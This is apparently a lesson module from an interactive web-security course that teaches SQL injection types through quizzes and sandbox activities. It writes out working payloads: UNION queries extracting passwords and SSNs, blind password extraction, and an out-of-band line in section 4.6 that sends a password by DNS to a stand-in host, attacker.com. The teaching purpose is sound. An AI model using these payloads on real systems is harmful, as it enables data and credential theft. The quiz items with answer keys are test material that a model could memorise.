# Module 04: Types of SQL Injection

> ⭐⭐ Intermediate | ⏱️ 25 minutes | 8 activities

---

## Learning Objectives
By the end of this module, students will be able to:
- Classify SQL injections into In-Band, Blind, and Out-of-Band categories
- Understand and apply UNION-based injection techniques
- Distinguish between Boolean-based and Time-based blind injection
- Select the appropriate injection type based on application behavior

---

## Lesson Flow

### 4.1 — The Three Families (Concept)

**Narrative**: *Not all SQL injections work the same way. The technique you use depends on what the application **shows you back**. Think of it as three levels of visibility:*

**Interactive Visual**: Three doors, student clicks each to reveal details

```
╔═══════════════════╗  ╔═══════════════════╗  ╔═══════════════════╗
║   🔓 IN-BAND      ║  ║   🔒 BLIND         ║  ║   📡 OUT-OF-BAND  ║
║                   ║  ║                   ║  ║                   ║
║  You can SEE the  ║  ║  You can't see    ║  ║  Data is sent to  ║
║  results directly ║  ║  results, but can ║  ║  an external      ║
║  on the page.     ║  ║  infer YES/NO.    ║  ║  server you       ║
║                   ║  ║                   ║  ║  control.          ║
║  • Error-based    ║  ║  • Boolean-based  ║  ║                   ║
║  • UNION-based    ║  ║  • Time-based     ║  ║  • DNS exfil      ║
║                   ║  ║                   ║  ║  • HTTP exfil      ║
╚═══════════════════╝  ╚═══════════════════╝  ╚═══════════════════╝
     EASY → → → → → → → MEDIUM → → → → → → → → → ADVANCED
```

---

#### 🧩 Activity 4.1a — MULTIPLE CHOICE

> **Type**: MC  
> **Difficulty**: Easy

**Prompt**: You inject a single quote `'` into a search field and the page displays:

```
Error: Unterminated string literal at position 42
```

Which type of SQL injection is this?

**Options**:
- A) In-Band (Error-based) ✅
- B) Blind (Boolean-based)
- C) Blind (Time-based)
- D) Out-of-Band

**Answer**: **A** — The application is directly showing you the database error. This is In-Band, Error-based injection. The error message gives you direct feedback about your injection's effect.

---

### 4.2 — In-Band: Error-Based Injection

**Narrative**: *Error-based injection is the attacker's favorite — the application literally tells you what went wrong. You can extract data by intentionally causing errors that include database information.*

**Example — Extracting the database version via error**:

```sql
-- MySQL: EXTRACTVALUE forces an XPath error that includes query results
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --

-- Error response:
-- XPATH syntax error: '~5.7.34-0ubuntu0.18.04.1'
```

The database version is leaked inside the error message!

---

#### 🧪 Activity 4.2a — PREDICT THE OUTPUT

> **Type**: PREDICT  
> **Difficulty**: Medium

**Prompt**: An attacker injects this into a vulnerable MySQL field:

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1))) --
```

What kind of information will appear in the error?

**Options**:
- A) The server's IP address
- B) The name of the first table in the database ✅
- C) All data from all tables
- D) The application's source code

**Answer**: **B** — `EXTRACTVALUE` forces an error that includes the result of the subquery. `information_schema.tables` contains metadata about all tables. `LIMIT 1` returns just the first table name.

---

### 4.3 — In-Band: UNION-Based Injection

**Narrative**: *UNION injection is the most powerful in-band technique. It lets you **append your own query** to the original, stealing data from any table.*

**The Rules of UNION**:
1. The number of columns in your query must **match** the original query
2. The data types should be **compatible**

**Step-by-step approach**:

```
Step 1: Find the number of columns
  ' ORDER BY 1--   ✅ works
  ' ORDER BY 2--   ✅ works  
  ' ORDER BY 3--   ✅ works
  ' ORDER BY 4--   ❌ error! → Original query has 3 columns

Step 2: Find which columns are displayed
  ' UNION SELECT 'aaa','bbb','ccc'--
  → See where 'aaa', 'bbb', 'ccc' appear on the page

Step 3: Extract data through visible columns
  ' UNION SELECT username, password, email FROM users--
```

---

#### 💻 Activity 4.3a — SANDBOX (Guided)

> **Type**: SANDBOX  
> **Difficulty**: Medium

**Setup**: A product search page. The app runs:

```python
query = f"SELECT name, price, category FROM products WHERE name LIKE '%{search}%'"
```

**Challenge (3 steps)**:

**Step 1**: Determine the number of columns.  
*Type an ORDER BY probe into the search bar.*

```
Search: ' ORDER BY 3--    → Works ✅
Search: ' ORDER BY 4--    → Error ❌
Answer: 3 columns
```

**Step 2**: Identify which columns appear on the page.  
```
Search: ' UNION SELECT 'col1','col2','col3'--
```
*The page displays col1 in the "Name" field, col2 in "Price", col3 in "Category".*

**Step 3**: Extract all usernames and passwords.  
```
Search: ' UNION SELECT username, password, email FROM users--
```

**On success**: Table displays user credentials. 🎉 "You've performed a UNION-based data extraction!"

---

#### 🏗️ Activity 4.3b — BUILD THE QUERY

> **Type**: BUILD  
> **Difficulty**: Medium

**Prompt**: You know a table `employees` has columns `first_name`, `salary`, and `ssn`. The original query has 3 columns. Build a UNION injection to extract all employee SSNs.

**Fragments available** (drag to build):

```
' UNION          SELECT          first_name,          salary,
ssn              FROM            employees            --
```

**Correct assembly**:
```sql
' UNION SELECT first_name, salary, ssn FROM employees--
```

**Explanation**: *The UNION must have exactly 3 columns to match the original query. We select the three columns we're interested in from the `employees` table.*

---

### 4.4 — Blind: Boolean-Based Injection

**Narrative**: *What if the application doesn't show errors or query results? You can still extract data by asking the database yes-or-no questions and watching how the page behaves.*

**The Concept**: Instead of seeing data directly, you observe:
- **TRUE condition** → Page loads normally (e.g., "Product found")
- **FALSE condition** → Page changes (e.g., "No results" or blank page)

**Example — Extracting the admin password one character at a time**:

```sql
-- Is the first character of admin's password 'a'?
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
→ Page loads normally = YES ✅

-- Is the second character 'b'?  
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin') = 'b' --
→ Page is blank = NO ❌

-- Is the second character 's'?
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin') = 's' --
→ Page loads normally = YES ✅
```

*Slowly, character by character: `a`, `s`, `e`, `c`, `r`, `e`, `t` → Password is `asecret`*

---

#### 🧪 Activity 4.4a — PREDICT THE OUTPUT

> **Type**: PREDICT  
> **Difficulty**: Hard

**Prompt**: An attacker sends these three requests to a search page:

```
Request 1: ' AND 1=1--     → Page shows "Results found"
Request 2: ' AND 1=2--     → Page shows "No results"
Request 3: ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8-- → Page shows "Results found"
```

What has the attacker just learned?

**Options**:
- A) The admin's password is 8 characters long ✅
- B) The admin's password is "12345678"
- C) There are 8 users in the database
- D) The password column has 8 rows

**Answer**: **A** — Request 1 & 2 confirm Boolean-based blind injection works (true vs false produces different responses). Request 3 asks "Is the password length equal to 8?" and gets a "true" response. The admin password is 8 characters long.

**💡 Key Insight**: *Boolean-based injection is slow (one question at a time) but extremely effective against applications that reveal no error details. Automated tools like sqlmap can perform thousands of these queries in seconds.*

---

### 4.5 — Blind: Time-Based Injection

**Narrative**: *Sometimes the page looks **exactly the same** regardless of true or false. No errors, no different content. In this case, we weaponize **time**.*

**The Concept**: We ask the database to **sleep** if a condition is true:
- **TRUE** → Response takes 5+ seconds
- **FALSE** → Response is instant

```sql
-- MySQL: Does the admin password start with 'a'?
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--

-- If response takes 5 seconds → YES, first character is 'a'
-- If response is instant → NO, try next character
```

---

#### 🧩 Activity 4.5a — MULTIPLE CHOICE

> **Type**: MC  
> **Difficulty**: Medium

**Prompt**: You send this payload and the server takes exactly 5 seconds to respond:

```sql
' AND IF(1=1, SLEEP(5), 0)--
```

You then send this and get an instant response:

```sql
' AND IF(1=2, SLEEP(5), 0)--
```

What can you conclude?

**Options**:
- A) The server is slow
- B) The field is vulnerable to time-based blind injection ✅
- C) The SLEEP function is not supported
- D) The application detected and blocked the injection

**Answer**: **B** — The first payload (true condition) caused a 5-second delay, while the second (false condition) returned instantly. This confirms you can control the database's execution time based on conditions — time-based blind injection is possible.

---

### 4.6 — Out-of-Band (OOB) Injection

**Narrative**: *Out-of-Band injection is the rarest technique. Instead of extracting data through the same HTTP response, you make the database server send data to a server you control via DNS or HTTP.*

```sql
-- MySQL: DNS exfiltration
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--

-- The database makes a DNS request to:
-- asecret.attacker.com
-- The attacker reads the password from their DNS logs!
```

**When to use OOB**:
- When in-band and blind techniques don't work
- When the database has outbound network access
- When you need faster extraction than time-based

---

#### 🖱️ Activity 4.6a — DRAG & DROP (Classification)

> **Type**: DND (Sort into categories)  
> **Difficulty**: Medium

**Prompt**: Classify each scenario into the correct SQL injection type:

**Scenarios**:
1. "The page shows a database error with table names" → **Error-based (In-Band)**
2. "The page shows the same content but takes 10 seconds" → **Time-based (Blind)**
3. "The search results include data from a different table" → **UNION-based (In-Band)**
4. "The page shows 'Results found' or 'No results'" → **Boolean-based (Blind)**
5. "The database sends a DNS request to the attacker's server" → **Out-of-Band**

**Student drags** each scenario into one of three bins: In-Band, Blind, Out-of-Band

---

### 4.7 — Decision Flowchart

**Interactive Decision Tree** (student clicks through):

```
START: Can you see query results on the page?
  │
  ├── YES → Can you use UNION to append queries?
  │          ├── YES → Use UNION-based injection
  │          └── NO  → Use Error-based injection
  │
  └── NO → Does the page behavior change based on true/false conditions?
            ├── YES → Use Boolean-based blind injection
            └── NO  → Does injecting SLEEP cause a time delay?
                       ├── YES → Use Time-based blind injection
                       └── NO  → Try Out-of-Band techniques
```

---

#### 🧩 Activity 4.7a — MULTIPLE CHOICE (Scenario)

> **Type**: MC  
> **Difficulty**: Hard

**Prompt**: You're testing a web application. You discover:
- Entering `'` in the search field returns a generic "An error occurred" page (no SQL details)
- Entering `' AND 1=1--` shows search results
- Entering `' AND 1=2--` shows "No results found"
- The `UNION SELECT` keyword is filtered/blocked

Which injection technique should you use?

**Options**:
- A) Error-based injection
- B) UNION-based injection
- C) Boolean-based blind injection ✅
- D) Time-based blind injection

**Answer**: **C** — Error-based won't work (generic error page). UNION is blocked. But the page behaves differently for true (1=1) vs false (1=2) conditions. Boolean-based blind injection is the way to go.

---

## Module 4 Summary

| Type | Visibility | Speed | Complexity |
|------|-----------|-------|------------|
| Error-based | See errors directly | ⚡ Fast | Easy |
| UNION-based | See data in results | ⚡ Fast | Medium |
| Boolean-based blind | Infer from page behavior | 🐌 Slow | Medium |
| Time-based blind | Infer from response time | 🐌🐌 Very slow | Hard |
| Out-of-Band | Data sent externally | ⚡ Fast | Advanced |

**Teaser for Module 05**: *You know the types. Now let's go deeper into exploitation — extracting entire database schemas, reading files from the server, and even executing system commands through SQL injection...*
